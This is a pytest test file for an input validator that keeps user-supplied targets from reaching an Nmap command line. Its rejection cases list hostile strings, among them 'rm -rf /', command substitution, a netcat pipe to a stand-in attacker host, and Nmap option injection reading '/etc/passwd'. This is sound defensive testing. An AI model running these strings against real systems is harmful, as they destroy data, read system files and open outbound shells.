"""Tests for network target parsing.

This module is the boundary that stops user input from reaching an Nmap command
line, so the rejection cases matter more than the acceptance ones.
"""

from __future__ import annotations

import pytest

from app.core.network import (
    MAX_TARGET_LENGTH,
    InvalidNetworkError,
    address_count,
    normalise_host_address,
    normalise_network,
)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("10.0.0.0/8", "10.0.0.0/8"),
        ("192.168.1.0/24", "192.168.1.0/24"),
        ("  10.10.0.0/24  ", "10.10.0.0/24"),
        ("100.64.0.0/22", "100.64.0.0/22"),
        # A bare address becomes an explicit single-host network.
        ("192.168.1.5", "192.168.1.5/32"),
        ("2001:db8::1", "2001:db8::1/128"),
        # IPv6 is compressed to its canonical form.
        ("2001:0db8:0000:0000:0000:0000:0000:0000/32", "2001:db8::/32"),
    ],
)
def test_valid_targets_are_normalised(raw: str, expected: str) -> None:
    """Accepted values come back in one canonical representation."""
    assert normalise_network(raw) == expected


def test_host_bits_set_is_rejected_rather_than_widened() -> None:
    """A prefix with host bits set must not be silently expanded.

    Accepting `192.168.1.5/24` as `192.168.1.0/24` would turn a request to scan
    one host into a request to scan 256 of them.
    """
    with pytest.raises(InvalidNetworkError, match="host bits set"):
        normalise_network("192.168.1.5/24")


def test_host_bits_error_names_the_intended_network() -> None:
    """The error tells the operator exactly what to write instead."""
    with pytest.raises(InvalidNetworkError, match=r"192\.168\.1\.0/24"):
        normalise_network("192.168.1.5/24")


@pytest.mark.parametrize(
    "hostile",
    [
        # Shell metacharacters.
        "10.0.0.1; rm -rf /",
        "10.0.0.1 && whoami",
        "10.0.0.1|nc attacker.test 4444",
        "$(id)",
        "`id`",
        "10.0.0.1\nrm -rf /",
        # Nmap option injection: the most realistic attack on this field.
        "--script=http-shellshock",
        "-oN /app/app/main.py",
        "-iL /etc/passwd",
        # Nmap's own shorthand, which is valid to Nmap but not to us.
        "10.0.0.1-254",
        "10.0.0.*",
        # Hostnames would trigger a DNS lookup and move the target off-net.
        "attacker.test",
        "localhost",
        # Malformed addresses.
        "999.999.999.999",
        "10.0.0.0/33",
        "10.0.0.0/-1",
        "",
        "   ",
    ],
)
def test_hostile_and_malformed_targets_are_rejected(hostile: str) -> None:
    """Anything outside the IP and CIDR grammar is refused."""
    with pytest.raises(InvalidNetworkError):
        normalise_network(hostile)


def test_overlong_target_is_rejected() -> None:
    """Input length is bounded before the parser ever sees it."""
    with pytest.raises(InvalidNetworkError, match="at most"):
        normalise_network("1" * (MAX_TARGET_LENGTH + 1))


def test_invalid_network_error_is_a_value_error() -> None:
    """Callers already handling ValueError need no special case."""
    assert issubclass(InvalidNetworkError, ValueError)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("192.168.1.5", "192.168.1.5"),
        ("  10.0.0.1 ", "10.0.0.1"),
        ("2001:0db8:0000:0000:0000:0000:0000:0001", "2001:db8::1"),
    ],
)
def test_valid_host_addresses_are_normalised(raw: str, expected: str) -> None:
    """A discovered host is stored in canonical form."""
    assert normalise_host_address(raw) == expected


def test_host_address_rejects_a_prefix() -> None:
    """A scan result belongs to exactly one host, never to a range."""
    with pytest.raises(InvalidNetworkError, match="single host"):
        normalise_host_address("10.0.0.0/24")


@pytest.mark.parametrize("hostile", ["10.0.0.1; id", "-oN /tmp/x", "not-an-ip", ""])
def test_hostile_host_addresses_are_rejected(hostile: str) -> None:
    """The same grammar restriction applies to scanner output."""
    with pytest.raises(InvalidNetworkError):
        normalise_host_address(hostile)


@pytest.mark.parametrize(
    ("cidr", "expected"),
    [("10.0.0.0/24", 256), ("10.0.0.0/32", 1), ("100.64.0.0/22", 1024)],
)
def test_address_count(cidr: str, expected: int) -> None:
    """Range size is reported so the per-scan target ceiling can be enforced."""
    assert address_count(cidr) == expected


def test_address_count_rejects_garbage() -> None:
    """A malformed range is an error, not a silent zero."""
    with pytest.raises(InvalidNetworkError):
        address_count("not-a-network")
